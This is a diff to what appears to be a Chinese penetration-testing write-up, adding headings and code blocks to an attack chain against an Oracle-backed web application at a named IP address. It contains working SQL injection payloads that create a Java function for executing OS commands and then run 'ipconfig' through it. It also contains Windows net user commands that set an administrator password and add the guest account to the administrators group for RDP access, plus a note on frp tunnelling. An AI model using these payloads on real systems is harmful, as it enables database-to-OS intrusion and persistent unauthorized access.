@@ -216,7 +216,7 @@ start vulscan
 
 
 
-```
+```bash
 GET / HTTP/1.1
 Host: 39.101.161.22
 Cache-Control: max-age=0
@@ -254,15 +254,24 @@ public class CommandExecutor {
 
 ```
 
-```
+### 创建用于执行命令的函数（execute_command）
+```bash
 name=admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''CREATE OR REPLACE FUNCTION execute_command(command IN VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME ''''CommandExecutor.execute(java.lang.String) return java.lang.String''''; '';commit;end;') from dual)>1--
-
-
+```
+### 执行ifconfig
+```bash
 name=admin' union select null,(select execute_command('ipconfig') from dual),null from dual--
 ```
 ![](assets/file-20260529165047140.png)
 
-
+此时，添加一个本地管理员用户 RDP 上去进行操作比较方便。
+```
+net user administrator abc123!@#
+net user administrator /active:yes
+或
+net user guest /active:yes
+net localgroup administrators guest /add
+```
 ## 搭建frp代理
 阿里云已经开放7000端口了，有防火墙还要再次执行`ufw allow 7000/tcp`
 
